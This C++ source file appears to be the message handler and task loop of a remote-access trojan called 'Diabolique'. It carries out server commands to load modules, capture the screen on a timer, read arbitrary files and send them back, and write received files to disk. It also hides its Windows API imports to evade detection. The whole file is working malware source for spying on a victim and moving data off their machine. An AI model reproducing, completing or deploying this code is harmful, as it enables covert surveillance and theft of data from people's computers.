#include "IDiabolique.h"
#include "IDiaboliqueIO.h"
#include <CDiaScreenCapture.h>
#include <filesystem>
#include <CCurrentEnviroment.h>
#include <CTransferFileTask.h>
void IDiabolique::_INTRNL_HandleMessage(diabolique_message_type_t nType, void* pData, size_t nDataSize)
{
#if 1
	if (nType == diabolique_message_type_t::k_dmSTCCreateModule)
	{
		create_module create_mod;
		if (!create_mod.ParseFromArray(pData, nDataSize))
			return; 

		int nModule = m_IO.CreateNewModule((DiaboliqueModuleType_t)create_mod.type());

		bool bFailed = false;
		if (nModule == -1)
			bFailed = true;

		module_creation_result res;

		if(!bFailed)
			res.set_index(nModule);

		res.set_failure(bFailed);
		res.set_type(create_mod.type());

		SendMessageToTransfer(diabolique_message_type_t::k_dmCTSModuleCreationNotify, &res);

	}
	else if (nType == diabolique_message_type_t::k_dmSTCInitializeModule)
	{
		initialize_module init_mod;
		if (!init_mod.ParseFromArray(pData, nDataSize))
			return;

		m_IO.InitializeModule(init_mod.module_index(),
			(void*)init_mod.init_data().data(),
			init_mod.init_data().length()
		);
	}
	else if (nType == diabolique_message_type_t::k_dmATAModuleData)
	{
		module_message mod_msg;
		if (!mod_msg.ParseFromArray(pData, nDataSize))
			return;

		m_IO.HandleData(mod_msg.module_index(),
			(char*)mod_msg.data().data(),
			mod_msg.data().length()
		);
	}
	else if (nType == diabolique_message_type_t::k_dmSTCScreenCapStartup)
	{
		screen_capture_startup scapstart;

		if (!scapstart.ParseFromArray(pData, nDataSize))
			return;

		CDiaScreenCapture* pScapTask = new CDiaScreenCapture();

		pScapTask->SetRunTicks(scapstart.ticks_between());
		AddTask(pScapTask);
	}
	else if (nType == diabolique_message_type_t::k_dmSTCRequestFile)
	{
		file_server_request request;

		if (!request.ParseFromArray(pData, nDataSize))
			return;

		AddTask(new CTransferFileTask(request.path(), -1));

#if 0
		CDiaFile file(request.path(), -1);
		
#ifdef _DEBUG
		printf("Sending File Of %d Bytes\n", file.GetFileSize());
#endif

		std::string file_name = std::filesystem::path::path(request.path()).filename().string();
		int nFilePos = 0;
		while ((file.GetFileSize() > nFilePos) && file.IsOpen())
		{
			// TODO : Task this
			file_transfer_segment seg;
			seg.set_name(file_name);
			size_t nBytesRead = 0;
			seg.set_data(file.ReadFile(FILESEGMENTSIZE, &nBytesRead, nFilePos));
			seg.set_file_size(file.GetFileSize());
			seg.set_pos(nFilePos);
			nFilePos += nBytesRead;
			SendMessageToTransfer(diabolique_message_type_t::k_dmCTSFileSegment, &seg);
		}

#ifdef _DEBUG
		printf("File Transfer Transmitted %d bytes\n", file.TotalBytesRead());
#endif
#endif
	}
	else if (nType == diabolique_message_type_t::k_dmSTCFileSegmentServ)
	{
		file_transfer_server_segment seg;

		if (!seg.ParseFromArray(pData, nDataSize))
			return;

		if (seg.drop_path().empty())
			seg.set_drop_path(std::filesystem::path(g_pEnv->GetExecutablePath()).remove_filename().string());

		m_FileTransport.HandleFileMessage(seg.file(), seg.drop_path());
	}

#endif
}

void IDiabolique::_INTRNL_RunTasks()
{

	while (!m_bKill)
	{
		m_TaskLock.lock();
		std::vector<int> deletables;
		for (const auto& task : m_Tasks)
		{
			task.second->Run();

			std::pair<diabolique_message_type_t, std::string> Data = task.second->GetTaskData();

			if (!(Data.first == diabolique_message_type_t::k_dmATAINVALID))
			{
				SendSeralizedMessageToTransfer(Data.first, &(Data.second.data()[0]), Data.second.length());
			}
			else
			{
				if (task.second->IsDone())
				{
					task.second->TaskEnd();
					deletables.push_back(task.first);
				}
			}



		}

		for (const auto& deletable : deletables)
		{
			if (m_Tasks.find(deletable) == m_Tasks.end())
				continue;

			CDiaTask* tsk = m_Tasks[deletable];
			if (tsk)
				delete tsk;

			m_Tasks.erase(deletable);
		}

		m_TaskLock.unlock();

		m_SendingPause.Check();

	}
}

void IDiabolique::_INTRNL_GetFetchDataForSend(diabolique_message_type_t& nType, void* pBuffer, size_t nBufferSize, size_t& nDataRecieved)
{
	WINDOWS_IMPORT_HIDE(Sleep, "Kernel32.dll");
	_Sleep(100);

	if (nBufferSize - 128 <= 0)
		return; // god dammit bobby!

	char* InputBuffer = (char*)_malloca(nBufferSize - 128);
	memset(InputBuffer, 0, nBufferSize - 128);

	int nModule = 0;
	nDataRecieved = 0;

	m_IO.RecieveDataFromCurrentModule(
		nModule,
		InputBuffer,
		nBufferSize - 128,
		nDataRecieved
	);

	if (nDataRecieved)
	{
		std::string data = std::string((char*)InputBuffer, nDataRecieved);
		module_message mod_msg;
		mod_msg.set_data(data);
		mod_msg.set_module_index(nModule);

		int nDataSize = mod_msg.ByteSizeLong();

		if ((nDataSize > nBufferSize) || !mod_msg.SerializeToArray(pBuffer, nBufferSize))
		{
#ifdef _DEBUG
			printf("Module Seralization Issue!\n");
#endif
			_freea(InputBuffer);
			return;
		}


		nType = diabolique_message_type_t::k_dmATAModuleData;
		nDataRecieved = nDataSize;
		_freea(InputBuffer);
		return;
	}


	_freea(InputBuffer);
}